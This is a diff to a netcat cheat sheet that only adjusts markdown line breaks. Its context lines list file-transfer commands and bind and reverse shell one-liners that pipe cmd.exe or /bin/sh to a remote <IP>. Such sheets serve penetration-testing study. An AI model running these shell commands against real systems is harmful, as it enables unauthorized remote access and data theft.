@@ -25,7 +25,7 @@ Basic
 `HEAD / HTTP/1.1`
 
 **File Transfer**  
-`nc -lvp 4444 > output.txt # Receiving End`
+`nc -lvp 4444 > output.txt # Receiving End`  
 `nc -nv <IP> < input.txt # Sending End`
 
 **Port Scanning**  
@@ -37,21 +37,21 @@ Basic
 Windows
 -----
 **Bind Shell**  
-`nc -lvp 4444 -e cmd.exe`
+`nc -lvp 4444 -e cmd.exe`  
 `nc -nv <IP> 4444 # Connect to the shell`
 
 **Reverse Shell**  
-`nc -lvp 443 # Attacking Machine - Waiting for shell`
+`nc -lvp 443 # Attacking Machine - Waiting for shell`  
 `nc -nv <IP> 443 -e cmd.exe # Target Machine - sending shell`
 
 Nix
 -----
 **Bind Shell**  
-`nc -lvp 4444 -e /bin/sh`
+`nc -lvp 4444 -e /bin/sh`  
 `nc -nv <IP> 4444 # Connect to the shell`
 
 **Reverse Shell**  
-`nc -lvp 443`
+`nc -lvp 443`  
 `nc -nv <IP> 443 -e /bin/sh`
 
 Additional Resources
